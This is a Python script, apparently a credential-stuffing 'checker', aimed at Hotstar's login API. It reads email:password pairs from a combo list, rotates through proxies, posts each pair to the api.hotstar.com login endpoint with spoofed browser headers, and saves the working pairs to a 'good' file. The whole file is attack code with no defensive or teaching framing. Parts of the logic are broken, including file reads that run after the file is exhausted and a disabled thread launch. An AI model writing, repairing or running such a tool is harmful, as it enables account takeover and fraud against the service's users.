

import re
import requests
from threading import Thread
proxy_d=[]
combo=open("combo.txt","r")

class Hotstar():


    def __init__(self):
        self.good=0
        self.bad=0
        self.hits=open("good.txt","w")
        self.count=0
    def proxies_maker(self):
        proxies=open("proxies.txt","r")
        for proxy in proxies.readlines():
            proxy_d.append({'http':'http://'+proxy[:-1],'https':'https://'+proxy[:-1],'ftp://':proxy[:-1]})

    def checker(self,email,password):
        loginUrl = "https://api.hotstar.com/in/aadhar/v2/web/in/user/login"

        payload = '{"isProfileRequired":false,"userData":{"deviceId":"6977eb6c-ca75-447b-ac9b-a219643e3431","pId":"044f7d6253d040208a2ad547374580c7","password":"' + password + '","username":"' + email + '","usertype":"email"},"verification":{}}'
        with requests.Session() as s:
            s.headers[
                'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
            s.headers["access-control-allow-credentials"] = "true"
            s.headers["access-control-allow-headers"] = "Content-Type, hotstarauth, deviceId, userIdentity, userId, secret, Authorization, userIdentityToken, stream-platform, username"
            s.headers["access-control-allow-methods"] = "GET, POST, DELETE, PUT, OPTIONS"
            s.headers["access-control-allow-origin"] = "https://www.hotstar.com"
            s.headers["content-type"] = "application/json;charset=UTF-8"
            s.headers["x-application-context"] = "umfnd-ap-southeast-1:docker:8080"
            s.headers["Referer" ] ="https://www.hotstar.com/"
            s.headers["Host"] = "api.hotstar.com"
            s.headers["Accept" ] ="*/*"
            s.headers["Accept-Language"] = "en-US,en;q=0.5"
            s.headers["Accept-Encoding"] = "gzip, deflate, br"
            s.headers["Content-Type"] = "application/json"
            s.headers["Origin"] = "https://www.hotstar.com"
            s.headers["Connection" ] ="keep-alive"
            r = s.post(loginUrl, data=payload)
            a=re.findall('Login Success',r.text)
            if a==[]:
                self.bad+=1
                print(str(self.count)+"|"+creds[:-1]+" -Bad")

            elif a==["Login Success"]:
                self.good += 1
                self.hits.write(creds)
                print(str(self.count)+"|"+creds[:-1]+" -Good")
                self.hits.flush()




chk=Hotstar()
chk.proxies_maker()
threads=int(input("Enter no. of threads \n"))
avg=int(len(combo.readlines())/threads)
for k in combo.readlines():
    print(k)

for creds in combo.readlines():
    try:
        chk.count+=1
        email, password = creds.split(":")
        new_pass=password[:-1]
        #p_t=Thread(target=chk.checker,args=(email,new_pass))
        #p_t.start()

    except:
        pass

